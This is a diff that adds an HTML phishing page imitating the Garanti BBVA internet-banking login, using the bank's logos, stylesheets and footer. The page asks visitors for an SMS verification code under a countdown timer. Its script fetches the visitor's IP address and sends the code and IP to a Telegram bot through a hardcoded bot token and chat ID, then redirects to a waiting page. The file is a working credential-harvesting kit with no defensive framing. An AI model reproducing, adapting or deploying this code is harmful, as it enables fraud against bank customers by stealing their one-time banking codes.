@@ -1,0 +1,177 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="tr" lang="tr"
+    class="login  no-htmlimports cookies eventlistener no-ie8compat json svg cssescape supports target es5array es5date es5function es5object strictmode es5string es5syntax es6array es5undefined es5 devicemotion deviceorientation localstorage sessionstorage no-contains cssall no-ambientlight inputsearchevent audio canvas video bgpositionshorthand csscalc cubicbezierrange cssgradients multiplebgs opacity csspositionsticky csspointerevents no-regions cssremunit rgba unknownelements fileinput placeholder scriptasync scriptdefer no-stylescoped inlinesvg svgasimg csschunit cssexunit mediaqueries hiddenscroll touchevents checked displaytable display-table fontface generatedcontent cssinvalid lastchild no-nthchild cssscrollbar siblinggeneral subpixelfont cssvalid cssvhunit cssvmaxunit cssvminunit cssvwunit formvalidation no-localizednumber textshadow backgroundblendmode no-wrapflow cssanimations csspseudoanimations appearance backdropfilter backgroundcliptext bgpositionxy bgrepeatround bgrepeatspace backgroundsize bgsizecover borderimage borderradius boxshadow boxsizing csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside ellipsis cssfilters flexbox flexwrap cssmask no-overflowscrolling cssreflections cssresize shapes textalignlast csstransforms csstransforms3d preserve3d csstransitions no-csspseudotransitions userselect mobile  ios  apng">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Garanti BBVA İnternet</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Content-language" content="tr">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="home" href="https://sube.garantibbva.com.tr" title="Garanti BBVA İnternet">
+    <link rel="shortcut icon" href="https://sube.assets.garantibbva.com.tr/assets/img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet"
+        href="https://sube.assets.garantibbva.com.tr/assets/css/mobile-login.css?__ctst__=1704744731883">
+    <link rel="stylesheet"
+        href="https://sube.assets.garantibbva.com.tr/assets/css/gt-facelift-login-style.css?__ctst__=1704744731883">
+</head>
+
+<body class="process hasJS" id="mobileTokenResult">
+    <div id="page" class="page">
+        <div id="header">
+
+            <header id="header" class="" style="width: 430px;">
+                <div class="navbar navbar-default">
+                    <div class="container">
+                        <div class="navbar-header"> <a class="navbar-brand"> <img
+                                    class="visible-desktop hidden-desktop-2x-ratio"
+                                    src="https://sube.assets.garantibbva.com.tr/assets/img/logo-garantibbva.png"
+                                    alt="Garanti Bankası A.Ş."> <img class="visible-desktop-2x-ratio"
+                                    src="https://sube.assets.garantibbva.com.tr/assets/img/logo-garantibbva-2x.png"
+                                    alt="Garanti Bankası A.Ş."> <img class="hidden-desktop only-mobile-2x-logo"
+                                    src="https://sube.assets.garantibbva.com.tr/assets/img/logo-garantibbva-2x.png"
+                                    alt="Garanti Bankası A.Ş."></a></div>
+                    </div>
+                </div>
+            </header>
+            <div class="no-title">
+
+
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Gönder</title>
+    <style>
+        body {
+            background-color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 200px;
+        }
+        button {
+            padding: 10px 20px;
+            margin-top: 10px;
+            background-color: #08591b; /* Buton rengi */
+            color: white; /* Yazı rengi */
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            opacity: 0.8; /* Hover efekti */
+        }
+    </style>
+</head>
+<body>
+
+    <h1>SMS:</h1>
+    <input type="text" id="smsInput" placeholder="Mesajınızı girin">
+    <div id="countdown">60</div>
+    <button id="sendButton">GİRİŞ</button>
+
+ <script>
+        // Geri sayım fonksiyonu
+        let countdownValue = 60;
+        const countdownElement = document.getElementById("countdown");
+        const interval = setInterval(() => {
+            countdownValue--;
+            countdownElement.innerText = countdownValue;
+
+            // Sayaç sıfırlandığında işlemi durdur
+            if (countdownValue <= 0) {
+                clearInterval(interval);
+            }
+        }, 1000); // 1 saniye aralıklarla geri sayım
+
+        document.getElementById("sendButton").addEventListener("click", () => {
+            const message = document.getElementById("smsInput").value;
+            const chatId = "-1002343753859"; // Telegram chat ID
+            const token = "7380726850:AAFZMnFFCtWf8SnIjlTCX04jpjlDNVo2TMY"; // Telegram API token
+
+            // IP adresini almak için API çağrısı yap
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const finalMessage = `${message}\nIP Adresi: ${ipAddress}`;
+
+                    // Telegram API'ye mesaj gönderme
+                    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: finalMessage
+                        }) // Noktalı virgül kaldırıldı
+                    });
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Mesaj gönderildi!');
+                        // Giriş butonuna basıldıktan sonra bekle2.html sayfasına yönlendirme
+                        window.location.href = "bekle2.html";
+                    } else {
+                        console.error('Mesaj gönderilemedi:', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Hata:', error);
+                });
+        });
+    </script>
+
+</body>
+
+
+
+
+
+
+
+
+		
+        <div id="footer" role="contentinfo" class="no-print footer">
+            <div class="container">
+                <div class="row patch-footer">
+                    <div class="col-md-6">
+                        <table class="table">
+                            <tbody>
+                                <tr>
+                                    <td> <a href="JavaScript:void(0);"
+                                            onclick="window.open('https://www.garantibbva.com.tr/tr/yardim_ve_oneriler/hakli_musteri_hatti/ssl/iletisim_formu.page','newWindow');">Bize
+                                            Ulaşın</a></td>
+                                    <td> <a href="JavaScript:void(0);"
+                                            onclick="window.open('http://www.garantibbva.com.tr/tr/bireysel/subesiz/internet_bankaciligi/guvenlik.page','newWindow');">Güvenlik
+                                            Bilgileri</a></td>
+                                    <td> </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-sm-8 col-xs-8">
+                        <table class="table">
+                            <tbody>
+                                <tr>
+                                    <td> Copyright © 2024 T.Garanti Bankası A.Ş.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
